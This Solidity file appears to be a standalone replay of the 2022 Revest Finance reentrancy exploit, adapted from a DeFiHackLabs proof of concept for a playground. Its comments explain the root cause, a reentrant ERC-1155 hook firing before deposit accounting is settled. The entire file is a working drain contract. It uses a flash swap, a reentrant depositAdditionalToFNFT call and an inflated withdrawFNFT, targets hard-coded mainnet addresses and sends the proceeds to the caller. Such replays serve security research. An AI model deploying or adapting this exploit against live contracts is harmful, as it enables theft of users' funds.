// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Revest).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (the uniswapV2Call flash-swap callback and the ERC-1155
// receiver hook live on the test itself, so there is no standalone contract to
// deploy). This contract is a faithful, self-contained copy of that inline
// attack (testExploit + uniswapV2Call + onERC1155Received) so the playground
// can deploy it and record run(). Logic, constants, and the exact RENA math are
// copied verbatim from test/Revest_exp.sol.
//
// Root cause: Revest's FNFT mint/withdraw path fires an ERC-1155 receiver hook
// (onERC1155Received) on the lock-creator BEFORE settling the FNFT's
// deposit/quantity accounting (a CEI violation + no reentrancy guard). The
// reentrant callback deposits 1e18 RENA against a single unit of an FNFT that
// was minted with quantity 360,000; withdrawFNFT then pays out that deposit
// across all 360,000 units, draining a huge RENA payout from a 5-RENA flash.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRevest {
    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 depositStopTime;
        bool maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }

    function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory recipients,
        uint256[] memory quantities,
        FNFTConfig memory fnftConfig
    ) external payable returns (uint256);

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external;

    function depositAdditionalToFNFT(uint256 fnftId, uint256 amount, uint256 quantity) external returns (uint256);
}

contract RevestDrain {
    IUniswapV2Pair private constant pair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
    IERC20 private constant rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
    IRevest private constant revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);

    uint256 public fnftId;
    bool public reentered;

    function run() public {
        // Flash-borrow 5 RENA from the RENA/WETH Uniswap V2 pair. The 1-byte
        // non-empty `data` triggers the pair's uniswapV2Call callback below.
        pair.swap(5 * 1e18, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        rena.approve(address(revest), type(uint256).max);

        IRevest.FNFTConfig memory fnftConfig;
        fnftConfig.asset = address(rena);
        fnftConfig.pipeToContract = address(0);
        fnftConfig.depositAmount = 0;
        fnftConfig.depositMul = 0;
        fnftConfig.split = 0;
        fnftConfig.depositStopTime = 0;
        fnftConfig.maturityExtension = false;
        fnftConfig.isMulti = true;
        fnftConfig.nontransferrable = false;

        address[] memory recipients = new address[](1);
        uint256[] memory quantities = new uint256[](1);
        recipients[0] = address(this);
        quantities[0] = uint256(2);
        fnftId = revest.mintAddressLock(address(this), new bytes(0), recipients, quantities, fnftConfig);
        quantities[0] = uint256(360_000);
        revest.mintAddressLock(address(this), new bytes(0), recipients, quantities, fnftConfig);

        revest.withdrawFNFT(fnftId + 1, 360_000 + 1);

        // Repay the flash loan (5 RENA + fee), then forward the entire surplus
        // to tx.origin — the attacker EOA that called run(). Mirrors the test.
        rena.transfer(msg.sender, ((((amount0 / 997) * 1000) / 99) * 100) + 1000);
        rena.transfer(tx.origin, rena.balanceOf(address(this)));
    }

    // ERC-1155 receiver hook fired by FNFTHandler DURING the second mintAddressLock,
    // BEFORE Revest settles the FNFT's deposit/quantity accounting. The reentrant
    // depositAdditionalToFNFT books 1e18 RENA against a single unit of the
    // 360,000-quantity FNFT, which withdrawFNFT later pays out per-unit.
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) public returns (bytes4) {
        if (id == fnftId + 1 && !reentered) {
            reentered = true;
            revest.depositAdditionalToFNFT(fnftId, 1e18, 1);
        }
        return this.onERC1155Received.selector;
    }
}
